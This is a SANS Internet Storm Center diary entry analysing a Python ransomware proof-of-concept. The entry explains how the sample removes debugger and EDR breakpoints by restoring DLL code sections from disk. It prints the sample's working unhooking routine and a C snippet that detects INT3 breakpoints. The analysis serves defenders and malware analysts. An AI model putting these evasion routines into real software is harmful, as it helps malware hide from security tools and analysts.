---
title: CTRL-Z DLL Hooking, (Wed, Sep 17th)
url: https://isc.sans.edu/diary/rss/32294
source: SANS Internet Storm Center, InfoCON: green
date: 2025-09-18
fetch_date: 2025-10-02T20:18:28.655793
---

# CTRL-Z DLL Hooking, (Wed, Sep 17th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Jesse La Grew](/handler_list.html#jesse-la-grew "Jesse La Grew")

Threat Level: [green](/infocon.html)

* [previous](/diary/32290)
* [next](/diary/32296)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [CTRL-Z DLL Hooking](/forums/diary/CTRLZ%2BDLL%2BHooking/32294/)

**Published**: 2025-09-17. **Last Updated**: 2025-09-17 08:02:44 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/CTRLZ%2BDLL%2BHooking/32294/#comments)

When you’re debugging a malware sample, you probably run it into a debugger and define some breakpoints. The idea is to take over the program control before it will perform “interesting” actions. Usually, we set breakpoints on memory management API call (like VirtualAlloc()) or process activities (like CreateProcess(), CreateRemoteThread(), ...).

The default technique used by debuggers to implement breakpoints is to “hook” the original API call by overwriting the very first byte of the function (overwriting it with an INT3([1](https://en.wikipedia.org/wiki/INT_%28x86_instruction%29)) instruction). This is called a software breakpoint because the program code is slightly modified and we instruct it to perform a software interrupt. Yes, it looks like a malicious behavior but for the good. Note that other breakpoint techniques exist but let's focus on the software one.

As usual, malware reversing is a perpetual cat and mouse game. Malware can detect such technique very easily. Just check if the first byte at the location of an API call in memory is “CC” (the opcode of INT3) and you're good:

```

HMODULE h = GetModuleHandleA("kernel32.dll");       // Get DLL address
FARPROC a = GetProcAddress(h, "VirtualAlloc");      // Get API call address
BYTE b = *a;
if (b == 0xCC) {                                    // CC is the INT3 opcode
    printf(“Breakpoint set on VirtualAlloc()!\n”);
}
```

The problem with this technique is that the malware must know which API call(s) has(ve) been patched. The same technique can be used by EDRs. Potentially, a lot of API calls are involved. When I'm debugging a malware sample, it's very common to have more than 10 breakpoints!

Because all this activity happens in memory (remember that copies of DLLs used by a program are loaded in the process memory space by the OS loader), another technique is just to “reload” the clean code (without the patches) from the original DLL (located on disk). It's like performing a "undo" or "CTRL-Z" to restore the initial DLL state. I found this technique in a Python malicious code found on VT yesterday. The script seems a ransomware PoC and it received a very low score (4/63) (SHA256: 197dd96e76114a1e6d4fb4964767a009d147a2c0de277bc5711dedb7a4152693)

During the initialization, the malware will “unhook” some DLLS to get rid of potential breakpoints:

```

def _unhook_dlls(self):
    """SXVM-style DLL unhooking"""
    try:
        # Unhook critical DLLs like SXVM does
        for dll in ['ntdll.dll', 'kernel32.dll', 'kernelbase.dll']:
            try:
                self._restore_text_section(dll)
            except:
                continue
            return True
    except:
        return False

def _restore_text_section(self, dll_name):
    """Restore .text section from disk like SXVM"""
    try:
        # Get system directory
        system_dir = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\'
        dll_path = system_dir + dll_name

        if os.path.exists(dll_path):
            with open(dll_path, 'rb') as f:
                disk_data = f.read()

            # Parse PE headers to find .text section
            pe_offset = struct.unpack('<I', disk_data[0x3C:0x40])[0]
            section_count = struct.unpack('<H', disk_data[pe_offset + 6:pe_offset + 8])[0]
            section_offset = pe_offset + 0x18 + struct.unpack('<H', disk_data[pe_offset + 0x14:pe_offset + 0x16])[0]

            for i in range(section_count):
                section_name = disk_data[section_offset + i*40:section_offset + i*40 + 8].decode().strip('\x00')
                if section_name == '.text':
                    virtual_size = struct.unpack('<I', disk_data[section_offset + i*40 + 8:section_offset + i*40 + 12])[0]
                    virtual_addr = struct.unpack('<I', disk_data[section_offset + i*40 + 12:section_offset + i*40 + 16])[0]
                    raw_size = struct.unpack('<I', disk_data[section_offset + i*40 + 16:section_offset + i*40 + 20])[0]
                    raw_offset = struct.unpack('<I', disk_data[section_offset + i*40 + 20:section_offset + i*40 + 24])[0]

                    # Get module base address
                    module_base = ctypes.windll.kernel32.GetModuleHandleW(dll_name)
                    if module_base:
                        # Copy .text section from disk to memory
                        text_section = disk_data[raw_offset:raw_offset + raw_size]
                        old_protect = ctypes.c_uint32()
                        self.kernel32.VirtualProtect(module_base + virtual_addr, raw_size, 0x40, ctypes.byref(old_protect))
                        ctypes.memmove(module_base + virtual_addr, text_section, raw_size)
                        self.kernel32.VirtualProtect(module_base + virtual_addr, raw_size, old_protect, ctypes.byref(old_protect))
                    break
        return True
    except:
        return False
```

This piece of code is easy to understand, it will restore the .text section (the section that contains executable code) from common DLLs - they provide a lot of interesting API calls used by malware. The DLL is read from disk, the PE headers are parsed to find the location and size of the .text section. The code is read and the re-injected in the loaded version of the DLL. The .text version is overwritten and... all software breakpoints are gone! This technique works perfectly because the program can perform any action on its own memory. Of course, to perform this action, you see calls to VirtualProtect() to change and restore the memory protection bits.

The script contains many reference to the "SXVM" ransomware and it not obfuscated. I did not find any reference to this name. Seems to be in development or a proof-of-concept?

(1) [https://en.wikipedia.org/wiki/INT\_(x86\_instruction)](https://en.wikipedia.org/wiki/INT_%28x86_instruction%29)

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Breakpoint](/tag.html?tag=Breakpoint) [Debugger](/tag.html?tag=Debugger) [DLL](/tag.html?tag=DLL) [Hook](/tag.html?tag=Hook) [Malware](/tag.html?tag=Malware) [Python](/tag.html?tag=Python)

[0 comment(s)](/diary/CTRLZ%2BDLL%2BHooking/32294/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/32290)
* [next](/diary/32296)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Fe...